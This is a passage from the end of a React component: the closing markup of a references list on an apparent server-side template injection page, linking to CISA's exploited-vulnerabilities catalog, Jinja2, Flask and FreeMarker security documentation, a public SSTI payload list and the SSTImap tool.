                    href='https://www.cisa.gov/known-exploited-vulnerabilities-catalog'
                  >
                    CISA Known Exploited Vulnerabilities Catalog (KEV)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://jinja.palletsprojects.com/en/stable/sandbox/'
                  >
                    Jinja2 documentation — sandbox and security considerations
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://flask.palletsprojects.com/en/stable/templating/'
                  >
                    Flask documentation — templating and autoescaping defaults
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://freemarker.apache.org/docs/app_faq.html'
                  >
                    FreeMarker FAQ — untrusted-template guidance and member access policies
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection'
                  >
                    PayloadsAllTheThings — SSTI payload list
                  </a>
                  ;{' '}
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/vladko312/SSTImap'
                  >
                    SSTImap
                  </a>
                </li>
              </ul>
            </section>
          </div>
        </div>
      </div>
    </>
  );
}
